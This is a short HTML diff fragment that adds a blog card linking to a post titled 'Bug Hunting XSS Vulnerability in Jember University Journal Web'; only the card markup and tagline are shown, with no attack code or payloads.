+                                <h5 class="blog-card__title">Bug Hunting XSS Vulnerability in Jember University Journal Web</h5>
+                                <p class="blog-card__description fs-6">Exploiting web for fun & profit (braindead edition)</p>
                                 <a href="blog-3.html" class="link-overlay position-absolute top-0 start-0 w-100 h-100"></a>
                             </div>
                         </div>
